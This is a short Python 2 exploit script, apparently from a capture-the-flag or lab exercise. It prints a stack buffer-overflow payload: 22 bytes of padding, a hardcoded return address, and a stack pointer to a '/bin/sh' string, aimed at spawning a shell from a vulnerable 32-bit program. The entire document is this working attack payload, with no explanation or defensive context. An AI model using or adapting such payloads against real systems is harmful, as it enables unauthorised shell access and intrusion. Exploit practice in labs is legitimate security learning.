from struct import pack

print 'A' * 22 + pack('<II', 0x08048eed, 0xbffe8b98 + 12) + "/bin/sh"
